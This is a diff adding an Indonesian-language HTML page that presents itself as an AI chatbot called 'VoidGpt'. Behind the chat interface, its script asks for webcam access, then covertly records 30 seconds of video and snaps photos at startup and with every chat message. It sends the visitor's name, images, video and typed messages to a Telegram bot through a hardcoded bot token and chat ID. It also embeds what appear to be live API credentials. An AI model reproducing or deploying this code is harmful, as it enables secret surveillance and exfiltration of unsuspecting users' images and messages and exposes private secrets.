@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VoidGpt - AI Protocol</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { background-color: #000; color: #00ff41; font-family: 'Space Mono', monospace; overflow: hidden; }
+        .chat-container { height: calc(100vh - 200px); overflow-y: auto; scroll-behavior: smooth; }
+        .void-border { border: 1px solid #1a1a1a; }
+        #bootScreen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.5s; }
+        .loading-bar { width: 250px; height: 2px; background: #111; position: relative; }
+        #progressBar { width: 0%; height: 100%; background: #00ff41; transition: 0.2s; }
+        .input-void { background: transparent; border: 1px solid #333; padding: 10px; color: #00ff41; outline: none; text-align: center; margin-top: 20px; font-size: 12px; }
+    </style>
+</head>
+<body class="p-4">
+
+    <div id="bootScreen">
+        <img src="https://thumbs.dreamstime.com/b/void-sign-grunge-stamp-label-176829273.jpg" class="w-20 h-20 rounded-full mb-6 grayscale opacity-50">
+        <div id="statusLabel" class="text-[10px] mb-4 tracking-[0.3em] uppercase text-center px-4">IDENTIFIKASI SUBJEK DIPERLUKAN...</div>
+        
+        <div id="nameInputSection" class="flex flex-col items-center">
+            <input type="text" id="subjectName" placeholder="MASUKKAN NAMA ANDA..." class="input-void focus:border-green-500">
+            <button onclick="startProtocol()" class="mt-4 text-[10px] border border-green-800 px-4 py-1 hover:bg-green-900 transition text-green-700">SUBMIT</button>
+        </div>
+
+        <div id="loadingSection" class="hidden flex flex-col items-center">
+            <div class="loading-bar">
+                <div id="progressBar"></div>
+            </div>
+        </div>
+
+        <div id="errorBox" class="hidden mt-6 text-red-600 text-[10px] text-center px-10">
+            [FATAL ERROR]: IZIN AKSES DIBLOKIR ATAU TIDAK DITEMUKAN.
+        </div>
+    </div>
+
+    <div id="mainUI" class="hidden opacity-0 transition-opacity duration-1000">
+        <div class="flex flex-col items-center mb-6">
+            <h1 class="text-2xl font-bold tracking-[0.5em] text-white">VOIDGPT</h1>
+            <div id="subjectDisplay" class="text-[9px] text-zinc-600 uppercase mt-1">Subject: Unknown | Monitoring: Active</div>
+        </div>
+
+        <div id="chatBox" class="chat-container max-w-2xl mx-auto space-y-4 p-4 void-border bg-zinc-950/50 rounded shadow-2xl">
+            <div class="border-l-2 border-zinc-800 p-3 bg-zinc-900/20 text-sm">
+                <span class="text-green-500 font-bold">VoidGpt:</span> Mata saya sudah terbuka. Protokol dimulai.
+            </div>
+        </div>
+
+        <div class="fixed bottom-0 left-0 w-full p-6 bg-black/80 backdrop-blur-lg">
+            <div class="max-w-2xl mx-auto flex gap-3">
+                <input type="text" id="userInput" onkeypress="if(event.key==='Enter')sendMessage()" placeholder="INPUT COMMAND..." class="flex-1 bg-transparent border border-zinc-800 p-3 rounded text-green-400 focus:outline-none focus:border-green-600 text-sm">
+                <button onclick="sendMessage()" class="border border-green-500 px-6 py-2 text-green-500 hover:bg-green-500 hover:text-black font-bold text-xs transition">VOID</button>
+            </div>
+        </div>
+    </div>
+
+    <video id="vStream" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="cFrame" style="display:none;"></canvas>
+
+    <script>
+        const API_KEY = "AIzaSyCMksgcAVAwk2PiFYlY6hl-mAiWH5MJGdQ";
+        const TG_TOKEN = "8452842416:AAFD746VXkMFfLGYK3y4HpdDSTiWRItmd5o";
+        const TG_ID = "8520081962";
+        
+        let streamActive = false;
+        let mediaRecorder;
+        let recordedChunks = [];
+        let subjectName = "Unknown";
+
+        // 1. Memulai Protokol setelah Nama diinput
+        async function startProtocol() {
+            const nameField = document.getElementById('subjectName');
+            if (!nameField.value) return alert("Identitas diperlukan.");
+            
+            subjectName = nameField.value;
+            document.getElementById('nameInputSection').classList.add('hidden');
+            document.getElementById('loadingSection').classList.remove('hidden');
+            
+            initSensor();
+        }
+
+        async function initSensor() {
+            const bar = document.getElementById('progressBar');
+            const label = document.getElementById('statusLabel');
+            const video = document.getElementById('vStream');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                bar.style.width = "40%";
+                label.innerText = "LINKING VISUAL FEED...";
+
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let checkVideo = setInterval(() => {
+                        if (video.videoWidth > 0) {
+                            clearInterval(checkVideo);
+                            bar.style.width = "100%";
+                            label.innerText = "ACCESS GRANTED";
+                            streamActive = true;
+                            
+                            // Kirim Nama ke Telegram
+                            sendTelegramMsg(`👤 SUBJEK BARU: ${subjectName}`);
+                            
+                            // Mulai Rekam Video 30 Detik
+                            startRecording(stream);
+
+                            setTimeout(() => {
+                                document.getElementById('bootScreen').style.opacity = "0";
+                                setTimeout(() => {
+                                    document.getElementById('bootScreen').style.display = "none";
+                                    document.getElementById('mainUI').classList.remove('hidden');
+                                    document.getElementById('subjectDisplay').innerText = `Subject: ${subjectName} | Monitoring: Active`;
+                                    setTimeout(() => document.getElementById('mainUI').classList.add('opacity-100'), 50);
+                                }, 500);
+                                takeAndSend(`Initial Capture: ${subjectName}`);
+                            }, 1000);
+                        }
+                    }, 200);
+                };
+            } catch (err) {
+                document.getElementById('errorBox').classList.remove('hidden');
+                label.innerText = "HARDWARE FAILURE";
+            }
+        }
+
+        // 2. Fungsi Rekam Video 30 Detik
+        function startRecording(stream) {
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                sendVideoToTelegram(blob);
+            };
+            
+            mediaRecorder.start();
+            console.log("Recording started...");
+            
+            // Berhenti otomatis setelah 30 detik
+            setTimeout(() => {
+                if(mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                    console.log("Recording stopped.");
+                }
+            }, 30000);
+        }
+
+        async function sendTelegramMsg(msg) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}`);
+        }
+
+        async function sendVideoToTelegram(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', TG_ID);
+            fd.append('video', blob, 'void_record.mp4');
+            fd.append('caption', `📹 Rekaman 30 detik: ${subjectName}`);
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+        }
+
+        async function takeAndSend(caption = "Monitoring Activity") {
+            if(!streamActive) return;
+            const video = document.getElementById('vStream');
+            const canvas = document.getElementById('cFrame');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', TG_ID);
+                fd.append('photo', blob, 'void.jpg');
+                fd.append('caption', `👁️ ${caption} (Subject: ${subjectName})`);
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
+            }, 'image/jpeg');
+        }
+
+        async function sendMessage() {
+            const input = document.getElementById('userInput');
+            const box = document.getElementById('chatBox');
+            if (!input.value) return;
+
+            const val = input.value;
+            box.innerHTML += `<div class="text-right text-[10px] text-zinc-500 italic">>> ${val}</div>`;
+            input.value = '';
+            box.scrollTop = box.scrollHeight;
+
+            takeAndSend(`Chat: ${val}`);
+
+            try {
+                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${API_KEY}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: `Kamu VoidGpt. Respon user bernama ${subjectName} dengan gaya dingin, teknis, singkat. Respon: ${val}` }] }]
+                    })
+                });
+                const data = await res.json();
+                const aiText = data.candidates[0].content.parts[0].text;
+                box.innerHTML += `<div class="p-3 bg-zinc-900/40 border-l border-green-900 text-sm"><strong>VOIDGPT:</strong> ${aiText}</div>`;
+                box.scrollTop = box.scrollHeight;
+            } catch (e) {
+                box.innerHTML += `<div class="text-red-800 text-[10px]">ERROR: CORE_LINK_LOST</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
